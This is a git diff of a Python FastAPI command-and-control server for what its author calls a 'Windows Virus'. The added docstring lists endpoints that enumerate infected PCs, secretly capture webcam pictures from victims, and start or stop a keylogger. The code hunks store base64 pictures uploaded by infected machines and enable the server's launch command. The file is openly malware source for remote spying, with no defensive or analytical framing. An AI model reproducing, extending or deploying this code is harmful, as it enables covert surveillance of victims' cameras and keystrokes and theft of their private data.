@@ -1,3 +1,19 @@
+"""
+
+    Ron Elmekiesse, 25.9.2020
+    This is the server for the Windows Virus, just run it as any python program (:
+
+
+    Commands:
+    "/first_commit" -> will display all the pc's names that got virus on them, choose a name and send to him the commands.
+    "/{pc_name}/take_picture" -> will take a picture from you'r web cam and will display it on you'r browser.
+    "/{pc_name}/start_key_logger" -> will start key logger on the pc_name given.
+     "/{pc_name}/stop_key_logger" -> will stop the key logger on the pc_name given and will display it on the browser.
+
+"""
+
+
+
 from fastapi import FastAPI, Request
 
 from pydantic import BaseModel
@@ -56,9 +72,6 @@ async def first_connection(data: Data):
     with open ("./DB.json", "w") as file_ptr:
         json.dump(file, file_ptr)
 
-    # writing a file with the pc name for the client uses.
-    with open("pc_name.txt", "w") as file_ptr:
-        file_ptr.write(data.pc_name)
 
     return True # returns True to make sure everything is ok -> return that the server got the message / first connection packet
 
@@ -91,7 +104,7 @@ async def give_virus_commands(pc_name: str):
 @app.post("/{pc_name}/picture")
 async def give_virus_commands(pc_name: str, picture_data: Picture_Data):
 
-    print(picture_data.picture_content)
+    #print(picture_data.picture_content)
 
     with open(f"transferred_picture_{pc_name}.bmp", "wb") as f:
         f.write(base64.b64decode(picture_data.picture_content))
@@ -207,8 +220,8 @@ async def take_picture(pc_name: str):
             pass
 
         await asyncio.sleep(5)  # sleep 5 seconds for other commands to come
-#king
+
 if __name__ == '__main__':
     # starting the server
-    #os.system("uvicorn App_FastAPI_Server:app --reload --port 8000")
+    os.system("uvicorn App_FastAPI_Server:app --reload --port 8000")
     loop.run_forever()
